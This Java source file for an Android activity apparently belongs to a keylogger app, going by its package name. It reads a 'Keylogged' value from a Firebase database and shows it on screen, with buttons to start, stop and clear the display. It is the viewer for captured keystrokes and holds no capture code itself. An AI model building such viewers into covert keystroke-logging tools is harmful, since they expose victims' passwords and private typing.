package com.example.keylogger;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class ThirdActivity extends AppCompatActivity {

    Boolean running=false;
    private TextView TextViewReference;
    Button ReadDataButton;
    Button StopDataButton;
    Button ClearDataButton;
    DatabaseReference reff;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_third);

        TextViewReference=(TextView) findViewById(R.id.Data);
        ReadDataButton=(Button)findViewById(R.id.ReadDatabutton);

        ReadDataButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                running=true;
                reff= FirebaseDatabase.getInstance().getReference();
//.child("Members").child("1");
                reff.addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        String name = snapshot.child("Keylogged").getValue().toString();
                        if(running) {
                            TextViewReference.setText(name);
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });
            }
        });

        StopDataButton=(Button)findViewById(R.id.stopDatabutton);
        StopDataButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                running=false;
            }
        });

        ClearDataButton=(Button) findViewById(R.id.clearDataButton);
        ClearDataButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                TextViewReference.setText(" ");
            }
        });


    }

}